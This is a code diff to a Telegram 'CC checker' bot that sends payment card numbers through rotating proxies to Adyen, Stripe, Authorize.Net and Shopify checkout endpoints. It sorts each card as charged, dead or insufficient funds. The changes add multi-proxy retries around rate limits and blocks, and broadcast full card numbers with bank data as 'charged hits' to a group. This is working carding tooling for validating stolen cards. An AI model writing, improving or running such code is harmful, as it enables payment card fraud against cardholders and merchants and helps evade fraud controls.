@@ -852,10 +852,16 @@ async def check_adyen_api(card, proxy, session):
             "Accept-Language": "en-US,en;q=0.9",
             "Connection": "keep-alive"
         }
-        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
+        # Use shorter timeout for Adyen to prevent hanging
+        adyen_timeout = aiohttp.ClientTimeout(total=25, connect=8)
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=adyen_timeout, ssl=False) as resp:
             text_data = await resp.text()
             if resp.status in [500, 502, 503, 504]:
                 return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
+            if resp.status == 429:
+                return {'status': 'Site Error', 'message': 'Rate Limited (429)', 'card': card}
+            if resp.status == 403:
+                return {'status': 'Site Error', 'message': 'Access Denied (403)', 'card': card}
             if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
                 return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
             if not text_data or not text_data.strip():
@@ -863,6 +869,7 @@ async def check_adyen_api(card, proxy, session):
             gt = "Adyen"
             pr = None
             rm = text_data.strip()
+            api_status = None
             try:
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg',
@@ -878,8 +885,19 @@ async def check_adyen_api(card, proxy, session):
                     if k in rj and rj[k] is not None and str(rj[k]).strip():
                         pr = str(rj[k]).strip()
                         break
+                api_status = str(rj.get('status', rj.get('Status', ''))).lower().strip()
             except Exception:
                 pass
+
+            # Trust API status field first
+            if api_status:
+                if api_status in ['authorised', 'authorized', 'success', 'completed', 'captured', 'settled', 'paid', 'approved']:
+                    return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                if api_status in ['declined', 'dead', 'rejected', 'denied', 'failed', 'refused']:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+                if api_status in ['insufficient', 'insufficient_funds', 'nsf']:
+                    return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
+
             clean_rm = unsf(rm).lower().strip()
 
             # CHARGED / AUTHORISED
@@ -919,15 +937,14 @@ async def check_adyen_api(card, proxy, session):
                 'incorrect', 'wrong', 'denied', 'rejected', 'blocked', 'banned',
                 'unauthorized', 'forbidden', 'invalid cvv', 'invalid expiry',
                 'acquirer fraud', 'shopper fraud', 'risk', 'not supported',
-                'unsupported', 'cancelled', 'canceled', 'abandoned', 'error',
-                'payment error', 'transaction error', 'processing error'
+                'unsupported', 'cancelled', 'canceled', 'abandoned'
             ]
             if any(k in clean_rm for k in dead_keywords):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr or '-'}
 
-            # SITE ERROR
+            # SITE ERROR - separate from dead
             site_error_keywords = [
-                'timeout', 'connection', 'unreachable', 'refused', 'gateway error',
+                'timeout', 'connection', 'unreachable', 'gateway error',
                 'server error', 'internal error', 'service unavailable', 'bad gateway',
                 'empty response', 'no response', 'format error', 'parse error',
                 'invalid request', 'missing parameter', 'required field'
@@ -959,10 +976,14 @@ async def check_stripe_api(card, proxy, session):
             "Accept-Language": "en-US,en;q=0.9",
             "Connection": "keep-alive"
         }
-        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT, ssl=False) as resp:
+        # Standard timeout for Stripe
+        stripe_timeout = aiohttp.ClientTimeout(total=60, connect=15)
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=stripe_timeout, ssl=False) as resp:
             text_data = await resp.text()
             if resp.status in [500, 502, 503, 504]:
                 return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
+            if resp.status == 429:
+                return {'status': 'Site Error', 'message': 'Rate Limited (429)', 'card': card}
             if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
                 return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
             if not text_data or not text_data.strip():
@@ -970,6 +991,7 @@ async def check_stripe_api(card, proxy, session):
             gt = "Stripe"
             pr = STRIPE_PRICE
             rm = text_data.strip()
+            api_status = None
             try:
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg',
@@ -985,8 +1007,19 @@ async def check_stripe_api(card, proxy, session):
                     if k in rj and rj[k] is not None and str(rj[k]).strip():
                         pr = str(rj[k]).strip()
                         break
+                api_status = str(rj.get('status', rj.get('Status', ''))).lower().strip()
             except Exception:
                 pass
+
+            # Trust API status field first
+            if api_status:
+                if api_status in ['succeeded', 'success', 'charged', 'approved', 'completed', 'captured', 'paid']:
+                    return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                if api_status in ['declined', 'dead', 'rejected', 'denied', 'failed']:
+                    return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                if api_status in ['insufficient', 'insufficient_funds', 'nsf']:
+                    return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+
             clean_rm = unsf(rm).lower().strip()
 
             # CHARGED / SUCCEEDED
@@ -997,7 +1030,7 @@ async def check_stripe_api(card, proxy, session):
                 'paid', 'payment confirmed', 'charge confirmed'
             ]
             if any(k in clean_rm for k in charged_keywords):
-                if 'not charged' in clean_rm or 'declined' in clean_rm:
+                if 'not charged' in clean_rm or 'declined' in clean_rm or 'not succeeded' in clean_rm:
                     return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                 return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
 
@@ -1087,15 +1120,15 @@ async def check_authnet_api(card, proxy, session):
                 pass
             clean_rm = unsf(rm).lower().strip()
             if any(k in clean_rm for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed', 'approved']):
-                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Saber Source', 'price': AUTHNET_PRICE}
             if any(k in clean_rm for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance', 'low balance', 'nsf']):
-                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Saber Source', 'price': AUTHNET_PRICE}
             if any(k in clean_rm for k in ['declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number',
                                             'suspected fraud', 'card code is invalid', 'authentication_required', '3d secure']):
-                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Saber Source', 'price': AUTHNET_PRICE}
             if any(k in clean_rm for k in ['error', 'failed', 'timeout', 'connection', 'unreachable', 'not found']):
                 return {'status': 'Site Error', 'message': rm, 'card': card}
-            return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Authorize.Net', 'price': AUTHNET_PRICE}
+            return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Saber Source', 'price': AUTHNET_PRICE}
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'API Timeout', 'card': card}
     except aiohttp.ClientError as e:
@@ -1261,8 +1294,12 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
                 return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
 
             status = res.get('status')
-            # Retry once with different proxy on Site Error
-            if status == 'Site Error':
+
+            # Multi-retry for Adyen and Stripe on Site Error with different proxies
+            max_retries = 3 if gateway_name in ["Adyen", "Stripe"] else 1
+            for attempt in range(max_retries):
+                if status != 'Site Error':
+                    break
                 if proxies and len(proxies) > 1:
                     p_dict2 = random.choice([p for p in proxies if p != p_dict])
                     p_url2 = p_dict2['proxy_url'] if p_dict2 else None
@@ -1273,20 +1310,66 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
                     elif gateway_name == "Stripe":
                         res = await check_stripe_api(card, p_url2, session)
                     status = res.get('status')
+                    # Small delay between retries
+                    if status == 'Site Error' and attempt < max_retries - 1:
+                        await asyncio.sleep(0.5)
 
             if status == 'Site Error':
                 return {'status': 'Site Error', 'message': res.get('message', 'Gateway Failed'), 'card': card, 'gateway': gateway_name, 'price': '-'}
             return res
         except Exception as e:
             return {'status': 'Site Error', 'message': f'Check Failed: {str(e)[:30]}', 'card': card, 'gateway': gateway_name, 'price': '-'}
-async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
+async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session, user_name="User"):
     await asyncio.sleep(HIT_DELAY)
     try:
         bi = await get_bin_info(card.split("|")[0][:6], session)
-        msg = format_card_result(card, gateway, price, bi, elapsed)
+
+        # Gateway display name
+        display_gate = gateway
+        if gateway == "AuthNet":
+            display_gate = "Saber Source"
+
+        # Price logic per gateway
+        if gateway == "Shopify":
+            display_price = price if price and price != '-' else '-'
+        elif gateway == "Adyen":
+            display_price = '-'
+        elif gateway == "Stripe":
+            display_price = "$1.00"
+        elif gateway == "AuthNet":
+            display_price = "$20.00"
+        else:
+            display_price = price or '-'
+
+        # Random animated emoji from source
+        hit_emoji = random.choice([CE_PARTY, CE_CROWN, CE_DIAMOND, CE_STAR, CE_FLASH, CE_SPARKLES, CE_BOOM])
+
+        msg = f"""<b>𝗡𝗲𝘄 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗛𝗶𝘁</b> {hit_emoji}
+▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
+<b>𝗥𝗲𝘀𝘂𝗹𝘁 ➔</b> <code>𝗢𝗿𝗱𝗲𝗿 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</code>
+<b>𝗣𝗿𝗶𝗰𝗲 ➔</b> <code>{display_price}</code>
+<b>𝗚𝗮𝘁𝗲 ➔</b> <code>{display_gate} 𝗣𝗮𝘆𝗺𝗲𝗻𝘁𝘀</code>
+▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
+<b>𝗖𝗮𝗿𝗱 ➔</b> <code>{card}</code>
+<b>𝗕𝗜𝗡 ➔</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
+<b>𝗕𝗮𝗻𝗸 ➔</b> <code>{bi.get('bank', '-')}</code>
+<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➔</b> <code>{bi.get('country', 'Unknown')} {bi.get('flag', '')}</code>
+<b>𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 ➔</b> <a href="tg://user?id={uid}">{escape_html(user_name)}</a> {hit_emoji}
+▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"""
+
         kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069")]]
+
+        # Send to user
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
-    except Exception: pass
+
+        # Send to hits group if configured
+        if HITS_GROUP_TARGET:
+            try:
+                await styled_send(bot, HITS_GROUP_TARGET, msg, use_gif=True)
+            except Exception as e:
+                logger.error(f"Failed to send hit to group: {e}")
+    except Exception as e:
+        logger.error(f"Hit send error: {e}")
 
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
@@ -1323,7 +1406,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
             [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
             [InlineKeyboardButton('Adyen (Triumph)', callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
             [InlineKeyboardButton('Stripe ($1.00)', callback_data="gate:Stripe", style="success", icon_custom_emoji_id="5447453226498552490")],
-            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('Saber Source ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
